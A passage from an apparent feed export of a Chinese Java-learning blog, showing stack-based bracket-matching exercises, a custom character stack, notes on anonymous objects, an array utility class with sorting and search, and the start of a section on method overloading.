class="doctag">@program</span>: exercise</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: 用栈进行括号匹配</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: yuuko</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2021-12-12 15:42</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">import</span> java.util.Stack;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">KuoHao</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Scanner input=<span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        String s=input.next();</span><br><span class="line">        System.out.println(solution(s));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">solution</span><span class="params">(String s)</span>&#123;</span><br><span class="line">        Stack&lt;Character&gt; stack1=<span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        <span class="type">char</span> currentCorrectChar;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;s.length();i++) &#123;</span><br><span class="line">            <span class="keyword">switch</span> (s.charAt(i)) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;(&#x27;</span>:</span><br><span class="line">                    stack1.push(<span class="string">&#x27;)&#x27;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;[&#x27;</span>:</span><br><span class="line">                    stack1.push(<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;&#123;&#x27;</span>:</span><br><span class="line">                    stack1.push(<span class="string">&#x27;&#125;&#x27;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">if</span>(stack1.isEmpty())</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                        currentCorrectChar = stack1.pop();</span><br><span class="line">                    <span class="keyword">if</span> (currentCorrectChar != s.charAt(i))</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!stack1.isEmpty())</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="自定义栈进行括号匹配"><a href="#自定义栈进行括号匹配" class="headerlink" title="自定义栈进行括号匹配"></a>自定义栈进行括号匹配</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: exercise</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: 自己定义的栈</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: yuuko</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2021-12-12 15:49</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">myCharStack</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> myCharStack header;</span><br><span class="line">    <span class="keyword">private</span> myCharStack next=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">char</span> content;</span><br><span class="line"></span><br><span class="line">    myCharStack()&#123;</span><br><span class="line">        <span class="built_in">this</span>.header=<span class="built_in">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    myCharStack(<span class="type">char</span> content)&#123;</span><br><span class="line">        <span class="built_in">this</span>.content=content;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">push</span><span class="params">(<span class="type">char</span> content)</span>&#123;</span><br><span class="line">        myCharStack stack1=<span class="keyword">new</span> <span class="title class_">myCharStack</span>(content);</span><br><span class="line">        stack1.next=<span class="built_in">this</span>.header.next;</span><br><span class="line">        <span class="built_in">this</span>.header.next=stack1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">char</span> <span class="title function_">pop</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">this</span>.header.next==<span class="literal">null</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;EmptyStackException here&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;X&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">char</span> popContent=<span class="built_in">this</span>.header.next.content;</span><br><span class="line">        <span class="built_in">this</span>.header.next=<span class="built_in">this</span>.header.next.next;</span><br><span class="line">        <span class="keyword">return</span> popContent;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isEmpty</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.header.next == <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: exercise</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>:</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: kkx</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2021-12-12 15:57</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">myKuoHao</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Scanner input=<span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        String s=input.next();</span><br><span class="line">        System.out.println(solution(s));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">solution</span><span class="params">(String s)</span>&#123;</span><br><span class="line">        myCharStack stack1=<span class="keyword">new</span> <span class="title class_">myCharStack</span>();</span><br><span class="line">        <span class="type">char</span> currentCorrectChar;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;s.length();i++) &#123;</span><br><span class="line">            <span class="keyword">switch</span> (s.charAt(i)) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;(&#x27;</span>:</span><br><span class="line">                    stack1.push(<span class="string">&#x27;)&#x27;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;[&#x27;</span>:</span><br><span class="line">                    stack1.push(<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;&#123;&#x27;</span>:</span><br><span class="line">                    stack1.push(<span class="string">&#x27;&#125;&#x27;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    currentCorrectChar = stack1.pop();</span><br><span class="line">                    <span class="keyword">if</span> (currentCorrectChar != s.charAt(i))</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!stack1.isEmpty())</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;用栈进行括号匹配&quot;&gt;&lt;a href=&quot;#用栈进行括号匹配&quot; class=&quot;headerlink&quot; title=&quot;用栈进行括号匹配&quot;&gt;&lt;/a&gt;用栈进行括号匹配&lt;/h2&gt;&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td cla</summary>
      
    
    
    
    <category term="Java练习" scheme="https://www.bandao.ltd/categories/Java%E7%BB%83%E4%B9%A0/"/>
    
    
    <category term="Java" scheme="https://www.bandao.ltd/tags/Java/"/>
    
    <category term="进阶" scheme="https://www.bandao.ltd/tags/%E8%BF%9B%E9%98%B6/"/>
    
    <category term="栈" scheme="https://www.bandao.ltd/tags/%E6%A0%88/"/>
    
  </entry>
  
  <entry>
    <title>java学习笔记10</title>
    <link href="https://www.bandao.ltd/coding/java/note/10.html"/>
    <id>https://www.bandao.ltd/coding/java/note/10.html</id>
    <published>2021-12-12T06:18:00.000Z</published>
    <updated>2024-11-04T03:12:49.882Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-理解“万事万物皆对象”"><a href="#1-理解“万事万物皆对象”" class="headerlink" title="1. 理解“万事万物皆对象”"></a>1. 理解“万事万物皆对象”</h2><h3 id="1-在-Java-语言范畴中，我们都将功能、结构等封装到类中，通过类的实例化，来调用具体的功能结构"><a href="#1-在-Java-语言范畴中，我们都将功能、结构等封装到类中，通过类的实例化，来调用具体的功能结构" class="headerlink" title="1.在 Java 语言范畴中，我们都将功能、结构等封装到类中，通过类的实例化，来调用具体的功能结构"></a>1.在 Java 语言范畴中，我们都将功能、结构等封装到类中，通过类的实例化，来调用具体的功能结构</h3><blockquote><p>Scanner,String 等<br>文件：File<br>网络资源：URL</p></blockquote><h3 id="2-涉及到-Java-语言与前端-Html、后端的数据库交互时，前后端的结构在-Java-层面交互时，都体现为类、对象。"><a href="#2-涉及到-Java-语言与前端-Html、后端的数据库交互时，前后端的结构在-Java-层面交互时，都体现为类、对象。" class="headerlink" title="2. 涉及到 Java 语言与前端 Html、后端的数据库交互时，前后端的结构在 Java 层面交互时，都体现为类、对象。"></a>2. 涉及到 Java 语言与前端 Html、后端的数据库交互时，前后端的结构在 Java 层面交互时，都体现为类、对象。</h3><h2 id="2、内存解析的说明"><a href="#2、内存解析的说明" class="headerlink" title="2、内存解析的说明"></a>2、内存解析的说明</h2><p>引用类型的变量，只可能存储两类值：null 或 地址值（含变量的类型）</p><h2 id="3-匿名对象的使用"><a href="#3-匿名对象的使用" class="headerlink" title="3. 匿名对象的使用"></a>3. 匿名对象的使用</h2><ol><li>理解：我们创建的对象，没有显式的赋给一个变量名。即为匿名对象</li><li>特征：匿名对象只能调用一次。</li><li>java 代码</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.java;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: 匿名对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: kkx</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2021-12-12 12:59</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InstanceTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Phone</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Phone</span>();</span><br><span class="line">        p.playGame();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Phone</span>().playGame();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Phone</span>().price = <span class="number">1999</span>;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Phone</span>().showPrice();        <span class="comment">//0.0</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//常用</span></span><br><span class="line">        <span class="type">PhoneMall</span> <span class="variable">mall</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PhoneMall</span>();</span><br><span class="line">        <span class="comment">//匿名对象的使用</span></span><br><span class="line">        mall.show(<span class="keyword">new</span> <span class="title class_">Phone</span>());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PhoneMall</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">(Phone phone)</span>&#123;</span><br><span class="line">        phone.sendEmail();</span><br><span class="line">        phone.playGame();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Phone</span>&#123;</span><br><span class="line">    <span class="type">double</span> price;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sendEmail</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;发送邮件&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">playGame</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;玩游戏&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">showPrice</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;价格为&quot;</span> + price);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-自定义工具类的封装"><a href="#4-自定义工具类的封装" class="headerlink" title="4. 自定义工具类的封装"></a>4. 自定义工具类的封装</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.java;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: 工具类的封装</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: kkx</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2021-12-12 13:38</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ArrayUtil</span> &#123;</span><br><span class="line">    <span class="comment">// 求数组的最大值</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getMax</span><span class="params">(<span class="type">int</span>[] arr)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">maxValue</span> <span class="operator">=</span> arr[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (maxValue &lt; arr[i]) &#123;</span><br><span class="line">                maxValue = arr[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxValue;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 求数组的最小值</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getMin</span><span class="params">(<span class="type">int</span>[] arr)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">minValue</span> <span class="operator">=</span> arr[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (minValue &gt; arr[i]) &#123;</span><br><span class="line">                minValue = arr[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> minValue;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 求数组的总和</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getSum</span><span class="params">(<span class="type">int</span>[] arr)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">            sum += arr[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 求数组的平均值</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAvg</span><span class="params">(<span class="type">int</span>[] arr)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> getSum(arr) / arr.length;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//如下的两个同名方法构成了重载</span></span><br><span class="line">    <span class="comment">// 反转数组</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reverse</span><span class="params">(<span class="type">int</span>[] arr)</span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length / <span class="number">2</span>; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> arr[i];</span><br><span class="line">            arr[i] = arr[arr.length - i - <span class="number">1</span>];</span><br><span class="line">            arr[arr.length - i - <span class="number">1</span>] = temp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reverse</span><span class="params">(String[] arr)</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 复制数组</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] copy(<span class="type">int</span>[] arr) &#123;</span><br><span class="line">        <span class="type">int</span>[] arr1 = <span class="keyword">new</span> <span class="title class_">int</span>[arr.length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr1.length; i++) &#123;</span><br><span class="line">            arr1[i] = arr[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> arr1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 数组排序</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sort</span><span class="params">(<span class="type">int</span>[] arr)</span>&#123;</span><br><span class="line">        <span class="comment">// 冒泡排序</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; arr.length - <span class="number">1</span> - i; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>]) &#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> arr[j];</span><br><span class="line">                    arr[j] = arr[j + <span class="number">1</span>];</span><br><span class="line">                    arr[j + <span class="number">1</span>] = temp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 遍历数组</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">            System.out.print(arr[i] + <span class="string">&quot;\t&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 查找指定元素</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getIndex</span><span class="params">(<span class="type">int</span>[] arr, <span class="type">int</span> dest)</span>&#123;</span><br><span class="line">        <span class="comment">// 线性查找：</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (dest == arr[i]) &#123;</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;<span class="comment">//返回一个负数，表示没有找到</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.java;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: 使用自定义工具类</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: kkx</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2021-12-12 13:44</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ArrayUtilTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ArrayUtil</span> <span class="variable">util</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayUtil</span>();</span><br><span class="line">        <span class="type">int</span>[] arr = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">32</span>,<span class="number">34</span>,<span class="number">32</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">54</span>,<span class="number">654</span>,-<span class="number">98</span>,<span class="number">0</span>,-<span class="number">53</span>,<span class="number">5</span>&#125;;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;最大值为&quot;</span> + util.getMax(arr));</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;排序前：&quot;</span>);</span><br><span class="line">        util.print(arr);</span><br><span class="line">        util.sort(arr);</span><br><span class="line">        System.out.println(<span class="string">&quot;排序后：&quot;</span>);</span><br><span class="line">        util.print(arr);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;查找：&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> util.getIndex(arr, -<span class="number">5</span>);</span><br><span class="line">        <span class="keyword">if</span>(index &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;找到了，索引地址为：&quot;</span> + index);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;未找到&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        util.reverse(arr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5-方法的重载"><a href="#5-方法的重载" class="headerlink" title="5. 方法的重载"></a>5. 方法的重载</h2><h3 id="1-定义："><a href="#1-定义：" class="headerlink" title="1. 定义："></a>1. 定义：</h3><blockquote><p>在同一个类中，允许存在一个以上的同名方法，只要它们的参数个数或者参数类型不同即可。<br>“两同一不同”:同一个类、相同方法名<br>参数列表不同：参数个数不同，参数类型不同</p></blockquote><h3 